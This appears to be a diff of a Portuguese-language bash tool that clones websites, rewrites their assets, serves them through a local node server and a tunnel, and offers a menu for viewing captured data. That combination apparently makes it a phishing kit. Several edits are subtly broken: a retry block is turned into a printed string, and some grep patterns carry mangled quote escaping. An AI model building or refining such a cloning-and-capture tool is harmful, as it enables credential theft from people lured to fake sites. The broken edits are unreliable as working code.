@@ -25,7 +25,7 @@ CAPTURED_DIR="$SCRIPT_DIR/captured_sites"
 TUNNEL_LOG="$SCRIPT_DIR/.tunnel.log"
 SCAN_LOG="$SCRIPT_DIR/.scan_result"
 
-saved_CLONES_DIR="$SCRIPT_DIR/saved_clones"
+SAVED_CLONES_DIR="$SCRIPT_DIR/saved_clones"
 mkdir -p "$SAVED_CLONES_DIR" "$CAPTURED_DIR" "$SITE_DIR"
 
 # =============================================
@@ -213,7 +213,7 @@ clone_site() {
         elif [ "$http_code" = "403" ] || [ "$http_code" = "401" ]; then
             echo -e "  ${RED}[$http_code] Acesso negado!${NC}"
             rm -f "$SITE_DIR/index.html"
-            [ "$use_proxy" = "y" ] && { echo -e "  ${YELLOW}-> Tentando sem proxy...${NC}; curl_cmd="curl"; use_proxy=""; attempt=$((attempt - 1)); }
+            [ "$use_proxy" = "y" ] && printf "%s\n" "  ${YELLOW}-> Tentando sem proxy...${NC}; curl_cmd=curl; use_proxy=; attempt=$((attempt - 1))"
         elif [ "$http_code" = "000" ]; then
             echo -e "  ${RED}[ERR] Sem conexao - timeout ou rede${NC}"
             rm -f "$SITE_DIR/index.html"
@@ -403,7 +403,8 @@ ENDSPA
     local asset_count=0
     > "$SCRIPT_DIR/.assets_list"
     local asset_pattern='\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)'
-    grep -oE '"//[^"]*'"$asset_pattern"'[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | cut -c3- >> "$SCRIPT_DIR/.assets_list"
+    grep -oE \"https?://[^\\\"]*$asset_pattern[^\\\"]*\" \"$SITE_DIR/index.html\" 2>/dev/null >> \"$SCRIPT_DIR/.assets_list\"
+    grep -oE \"//[^\\\"]*$asset_pattern[^\\\"]*\" \"$SITE_DIR/index.html\" 2>/dev/null >> \"$SCRIPT_DIR/.assets_list\"
     for css_file in "$SITE_DIR"/css_*.css; do
         [ -f "$css_file" ] || continue
         grep -oE 'url\\([^)]*\\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^)]*\\)' "$css_file" 2>/dev/null | perl -pe 's|url\(||;s|\).*||;s|[" ]||g' >> "$SCRIPT_DIR/.assets_list"
@@ -445,8 +446,7 @@ ENDSPA
         done
     done
     perl -i -pe "s|\Q${placeholder}\E|${local_url}|g" "$SITE_DIR/index.html"
-    perl -i -pe 's|<script[^>]*src="https?://connect\.facebook\.net[^"]*"[^>]*></script>||gi' "$SITE_DIR/index.html"
-    perl -i -pe 's|<script[^>]*src="https?://platform\.twitter\.com[^"]*"[^>]*></script>||gi' "$SITE_DIR/index.html"
+    python3 "$SCRIPT_DIR/strip_social.py" "$SITE_DIR/index.html"
     perl -i -pe "s|http://\Q${my_ip}\E|${local_url}|gi" "$SITE_DIR/index.html"
 
     local ext_count=$(grep -oE '(src|href)="https?://[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | grep -v 'localhost\|127\.0\.0\.1' | wc -l | tr -d ' ')
@@ -514,7 +514,7 @@ ENDSPA
         tail -10 "$SCRIPT_DIR/server.log" 2>/dev/null | while read l; do echo -e "  ${RED}$l${NC}"; done
         echo -e "  ${WHITE}---${NC}"
         rm -f "$SCRIPT_DIR/.server.pid"
-        echo -n "  Tentar de novo? (s/n): "
+        printf "Tentar de novo? s/n: "
         read RETRY
         if echo "$RETRY" | grep -qi "^s"; then
             pkill -9 -f "node.*server.js" 2>/dev/null; sleep 2
@@ -1607,7 +1607,6 @@ while true; do
             echo -e "${YELLOW}Press Enter...${NC}"
             read
             ;;
-
 
         2) view_capturas ;;
         3) start_tunnel ;;
